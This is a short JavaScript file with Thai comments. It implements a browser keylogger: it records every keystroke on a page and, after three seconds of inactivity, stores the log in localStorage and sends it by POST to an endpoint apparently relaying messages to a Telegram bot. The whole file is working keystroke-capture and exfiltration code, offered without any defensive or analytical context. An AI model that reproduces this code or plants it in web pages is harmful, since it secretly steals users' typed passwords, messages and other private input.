let keyLogs = "";
let timeout = null;

document.addEventListener("keydown", (event) => {
  clearTimeout(timeout); // รีเซ็ต timeout เมื่อมีการกด key ใหม่

  // ตรวจสอบว่า event.key เป็น undefined หรือไม่
  if (event.key !== undefined) {
    keyLogs += event.key;

    // ตรวจสอบว่ากดปุ่ม Enter เพื่อเพิ่มบรรทัดใหม่
    if (event.key === "Enter") {
      keyLogs += "\n";
    }
  } else {
    console.log("Undefined key detected");
  }

  console.log(`keyLogs: ${keyLogs}`);

  // ตั้งค่า timeout สำหรับการตรวจจับการหยุดกดปุ่มคีย์นาน 3 วินาที
  timeout = setTimeout(() => {
    keyLogs += "\n"; // เพิ่มบรรทัดใหม่ถ้าหยุดกดเป็นเวลา 3 วิ
    console.log(`Added new line due to timeout. keyLogs: ${keyLogs}`);

    // เก็บข้อมูล keyLogs ลงใน localStorage ก่อนส่ง
    localStorage.setItem("keyLogs", keyLogs);

    // เรียกใช้ฟังก์ชันส่ง keyLogs ไปยัง API เมื่อหยุดการกดเป็นเวลา 3 วินาที
    sendKeyLogsToAPI(keyLogs);
  }, 3000);
});

// ฟังก์ชันสำหรับส่ง keyLogs ไปยัง API
function sendKeyLogsToAPI(keyLogs) {
  fetch("http://localhost/TelegramBotAPI/api/SendMessage", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      Message: keyLogs, // ส่งข้อมูลในรูปแบบ JSON
    }),
  })
    .then((response) => {
      if (response.ok) {
        return response.json();
      }
      throw new Error("Failed to send message");
    })
    .then((data) => {
      console.log("Message sent successfully:", data);

      // เคลียร์ค่า keyLogs เมื่อส่งสำเร็จ
      keyLogs = "";
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}
